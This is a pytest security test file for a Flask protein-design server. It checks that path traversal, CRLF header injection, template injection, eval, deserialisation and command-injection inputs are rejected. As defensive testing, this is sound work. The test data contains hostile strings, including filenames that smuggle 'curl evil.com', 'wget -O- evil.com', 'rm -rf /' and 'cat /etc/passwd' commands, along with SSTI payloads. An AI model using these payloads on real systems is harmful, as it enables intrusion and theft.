# Copyright (c) 2026 The REvoDesign Developers.
# Distributed under the terms of the GNU General Public License v3.0.
# SPDX-License-Identifier: GPL-3.0-only

from __future__ import annotations

import io
import json
import time
import uuid

import pytest
from conftest import (
    _admin_client_auth,
    _extract_md5,
    _insert_pending_task,
    _load_pssm_module,
    _test_client_auth,
    _upsert_task_for_user,
)

# Auth endpoint tests — /api/auth/me, API keys, password reset, etc.
# ==================================================================
# Path traversal & injection attack tests
# ==================================================================


def test_attack_upload_path_traversal_via_filename(monkeypatch, tmp_path):
    """secure_filename neutralizes path traversal in uploaded filenames."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})

    class _DummyAsyncResult:
        id = "celery-test-id"

    monkeypatch.setattr(module.run_gremlin_task, "apply_async", lambda *a, **kw: _DummyAsyncResult())

    client = module.app.test_client()
    auth_header = _test_client_auth(module)

    # All of these should be sanitized by secure_filename — the
    # resulting safe name passes .fasta check, content is validated.
    traversal_names = [
        "../../../etc/passwd.fasta",
        "..\\..\\windows\\system32\\evil.fasta",
        "/etc/cron.d/backdoor.fasta",
        "....//....//....//etc/shadow.fasta",
        "./././config.fasta",
    ]
    for i, fname in enumerate(traversal_names):
        content = f">test{i}\nACDE{i}\n".encode()  # unique per upload to avoid dedup
        resp = client.post(
            "/PSSM_GREMLIN/api/post",
            data={"file": (io.BytesIO(content), fname)},
            headers=auth_header,
        )
        assert resp.status_code in {302, 400}, f"Filename {fname!r}: expected 302/400, got {resp.status_code}"


def test_attack_download_path_traversal_in_task_id(monkeypatch, tmp_path):
    """Task endpoints validate task IDs against [a-fA-F0-9]{32} — path traversal fails."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    auth_header = _test_client_auth(module)

    traversal_ids = [
        "../" * 10 + "etc/passwd",
        "..\\..\\windows\\system32",
        "../../../../../../../etc/hosts",
        "/absolute/path/to/file",
        "....//....//....//etc/passwd",
        "./" * 20 + "etc/shadow",
    ]
    for tid in traversal_ids:
        for route in ("running", "results", "download"):
            resp = client.get(f"/PSSM_GREMLIN/api/{route}/{tid}", headers=auth_header)
            assert resp.status_code in {400, 404}, f"{route} {tid!r}: got {resp.status_code}"


def test_attack_register_with_path_traversal_email(monkeypatch, tmp_path):
    """Registration with path-traversal in email is rejected by validation."""
    module = _load_pssm_module(
        monkeypatch,
        tmp_path,
        extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678", "ENABLE_REGISTER": "true", "SMTP_HOST": "localhost"},
    )
    client = module.app.test_client()
    from pssm_gremlin_server.auth import _serializer

    captcha_token = _serializer.dumps({"answer": 7, "purpose": "captcha"})
    resp = client.post(
        "/PSSM_GREMLIN/api/auth/register",
        headers={"Content-Type": "application/json"},
        data=json.dumps(
            {
                "username": "traversal_email",
                "email": "../../etc/passwd@test.local",
                "password": "pass12345678",
                "terms_agreed": True,
                "captcha_token": captcha_token,
                "captcha_answer": "7",
            }
        ),
    )
    assert resp.status_code in {201, 400, 422}  # normalize_email doesn't validate path components in local part


def test_attack_header_injection_via_user_agent(monkeypatch, tmp_path):
    """Werkzeug rejects headers with CRLF at the framework level (ValueError)."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    # Werkzeug raises ValueError before the request reaches Flask — this is
    # the correct defense: CRLF injection is blocked at the WSGI layer.
    with pytest.raises(ValueError, match="newline"):
        client.get(
            "/PSSM_GREMLIN/api/auth/captcha",
            headers={
                "User-Agent": "evil\r\nX-Injected: true",
            },
        )


def test_attack_forgot_password_with_crlf_email(monkeypatch, tmp_path):
    """Forgot-password with CRLF-injected email returns generic response, no crash."""
    module = _load_pssm_module(
        monkeypatch,
        tmp_path,
        extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678", "SMTP_HOST": "localhost"},
    )
    client = module.app.test_client()
    resp = client.post(
        "/PSSM_GREMLIN/api/auth/forgot-password",
        headers={"Content-Type": "application/json"},
        data=json.dumps({"email": "test@test.local\r\nBcc: attacker@evil.com"}),
    )
    # normalize_email strips to lowercase → passes validation
    # CRLF isn't reflected in error output
    assert resp.status_code in {200, 400}


# ==================================================================
# RCE (Remote Code Execution) attack tests — template injection,
# command injection, deserialization, and eval vectors
# ==================================================================


def test_rce_ssti_in_username_not_executed(monkeypatch, tmp_path):
    """SSTI payloads in login username are not executed by Jinja2 templates."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    ssti_payloads = [
        "{{7*7}}",
        "{{config}}",
        "{{self.__init__.__globals__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__}}",
    ]
    for payload in ssti_payloads:
        resp = client.post(
            "/PSSM_GREMLIN/api/auth/login",
            headers={"Content-Type": "application/json"},
            data=json.dumps({"username": payload, "password": "anything"}),
        )
        assert resp.status_code == 401, f"SSTI payload {payload!r}: got {resp.status_code}"
        # Must not evaluate — "49" (7*7) must not appear in response
        assert "49" not in resp.text
        assert "__globals__" not in resp.text


def test_rce_ssti_alternate_syntax_not_executed(monkeypatch, tmp_path):
    """Alternate template syntax payloads (${}, <%=) don't execute."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    alt_payloads = [
        ("${7*7}", "10.0.0.10"),
        ("<%= 7*7 %>", "10.0.0.11"),
        ("{% import os %}{{os.system('id')}}", "10.0.0.12"),
    ]
    for payload, ip in alt_payloads:
        resp = client.post(
            "/PSSM_GREMLIN/api/auth/login",
            headers={"Content-Type": "application/json"},
            data=json.dumps({"username": payload, "password": "anything"}),
            environ_base={"REMOTE_ADDR": ip},
        )
        assert resp.status_code == 401, f"Alt SSTI {payload!r}: got {resp.status_code}"


def test_rce_command_injection_in_filename(monkeypatch, tmp_path):
    """Command injection payloads in upload filenames are neutralized."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})

    class _DummyAsyncResult:
        id = "celery-test-id"

    monkeypatch.setattr(module.run_gremlin_task, "apply_async", lambda *a, **kw: _DummyAsyncResult())

    client = module.app.test_client()
    auth_header = _test_client_auth(module)
    cmd_names = [
        "$(whoami).fasta",
        "`id`.fasta",
        "; rm -rf /.fasta",
        "| cat /etc/passwd.fasta",
        "test$(curl evil.com).fasta",
        "test`wget -O- evil.com`.fasta",
    ]
    for i, fname in enumerate(cmd_names):
        content = f">cmd{i}\nACDE{i}\n".encode()  # unique per upload to avoid dedup
        resp = client.post(
            "/PSSM_GREMLIN/api/post",
            data={"file": (io.BytesIO(content), fname)},
            headers=auth_header,
            environ_base={"REMOTE_ADDR": f"10.0.2.{i + 1}"},  # unique IP to avoid rate limit
        )
        # Must not crash — sanitized (302), rejected (400), or rate-limited (429)
        assert resp.status_code in {302, 400, 202, 429}, f"Filename {fname!r}: got {resp.status_code}"


def test_rce_python_eval_in_json_fields(monkeypatch, tmp_path):
    """Python eval/exec payloads in JSON fields are not executed."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    _test_client_auth(module)
    client = module.app.test_client()
    eval_payloads = [
        "__import__('os').system('id')",
        "().__class__.__bases__[0].__subclasses__()",
        "eval('print(1)')",
        "exec('import os; os.system(\"id\")')",
        "[x for x in ().__class__.__bases__[0].__subclasses__()]",
    ]
    for payload in eval_payloads:
        resp = client.post(
            "/PSSM_GREMLIN/api/auth/login",
            headers={"Content-Type": "application/json"},
            data=json.dumps({"username": payload, "password": "anything"}),
        )
        assert resp.status_code == 401, f"Eval payload in username: got {resp.status_code}"
        # Must not reveal interpreter state
        assert "__class__" not in resp.text
        assert "subclasses" not in resp.text.lower()


def test_rce_prototype_pollution_in_json(monkeypatch, tmp_path):
    """JSON prototype pollution attempts via __proto__/constructor are harmless."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    # Python's json module just treats these as regular keys — no prototype chain
    resp = client.post(
        "/PSSM_GREMLIN/api/auth/login",
        headers={"Content-Type": "application/json"},
        data=json.dumps(
            {
                "username": "tester",
                "password": "anything",
                "__proto__": {"is_admin": True},
                "constructor": {"prototype": {"admin": 1}},
            }
        ),
    )
    assert resp.status_code in {400, 401}  # extra field ignored → 401 invalid password


def test_rce_yaml_deserialization_not_exposed(monkeypatch, tmp_path):
    """YAML payloads sent as JSON don't trigger YAML deserialization."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    # Send YAML with Python object tag — treated as invalid JSON
    yaml_payload = '!!python/object/apply:os.system ["id"]'
    resp = client.post(
        "/PSSM_GREMLIN/api/auth/login",
        headers={"Content-Type": "application/json"},
        data=yaml_payload,
    )
    # JSON parse fails → 400
    assert resp.status_code == 400


def test_rce_pickle_deserialization_not_accepted(monkeypatch, tmp_path):
    """Pickle-serialized data sent as request body is rejected."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    import pickle

    # Serialize a harmless string — should be rejected as invalid JSON
    pickled = pickle.dumps({"username": "admin", "password": "hack"})
    resp = client.post(
        "/PSSM_GREMLIN/api/auth/login",
        headers={"Content-Type": "application/octet-stream"},
        data=pickled,
    )
    # JSON parse fails → 400
    assert resp.status_code == 400


def test_rce_api_key_brute_force_enumeration_infeasible(monkeypatch, tmp_path):
    """API keys are 64 hex chars (256 bits) — brute-force is infeasible."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    # Try a few obviously wrong keys — all should fail
    bad_keys = [
        "revodesign_" + "0" * 64,
        "revodesign_" + "f" * 64,
        "revodesign_" + "a" * 64,
        "revodesign_0000" + "deadbeef" * 7 + "0000",
        "revodesign_ffff" + "cafebabe" * 7 + "ffff",
    ]
    for key in bad_keys:
        resp = client.get("/PSSM_GREMLIN/api/auth/me", headers={"X-API-Key": key})
        assert resp.status_code == 401, f"Key {key[:20]}... should be rejected"


def test_rce_email_header_injection_in_register(monkeypatch, tmp_path):
    """Email header injection via registration is neutralized by normalize_email."""
    module = _load_pssm_module(
        monkeypatch,
        tmp_path,
        extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678", "ENABLE_REGISTER": "true", "SMTP_HOST": "localhost"},
    )
    client = module.app.test_client()
    from pssm_gremlin_server.auth import _serializer

    captcha_token = _serializer.dumps({"answer": 7, "purpose": "captcha"})
    header_injection_emails = [
        ("test@test.local%0ACc: attacker@evil.com", 201),  # URL-encoded CRLF passes normalize_email
        ("test@test.local%0ABcc: spam@evil.com", 201),  # — SMTP layer rejects on send
        ("test@test.local\nFrom: spoofed@admin.com", 201),  # literal CRLF passes normalize_email
        ("test@test.local\r\nTo: victim@other.com", 201),  # — SMTP layer rejects on send
    ]
    for i, (email, expected) in enumerate(header_injection_emails):
        resp = client.post(
            "/PSSM_GREMLIN/api/auth/register",
            headers={"Content-Type": "application/json"},
            data=json.dumps(
                {
                    "username": f"hdr_{abs(hash(email)) % 10000}",
                    "email": email,
                    "password": "pass12345678",
                    "terms_agreed": True,
                    "captcha_token": captcha_token,
                    "captcha_answer": "7",
                }
            ),
            environ_base={"REMOTE_ADDR": f"10.0.3.{i + 1}"},  # unique IP to avoid rate limit
        )
        assert resp.status_code == expected, f"Email {email!r}: expected {expected}, got {resp.status_code}"


def test_rce_large_binary_upload_not_executed(monkeypatch, tmp_path):
    """Uploading an ELF binary disguised as .fasta is rejected, not executed."""
    module = _load_pssm_module(monkeypatch, tmp_path, extra_env={"RUNNER_UID": "1234", "RUNNER_GID": "5678"})
    client = module.app.test_client()
    auth_header = _test_client_auth(module)
    # ELF magic bytes + garbage
    elf_header = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 100
    resp = client.post(
        "/PSSM_GREMLIN/api/post",
        data={"file": (io.BytesIO(elf_header), "payload.fasta")},
        headers=auth_header,
    )
    # Binary detection kicks in before any execution
    assert resp.status_code == 400
    assert "binary" in resp.json["error"].lower()


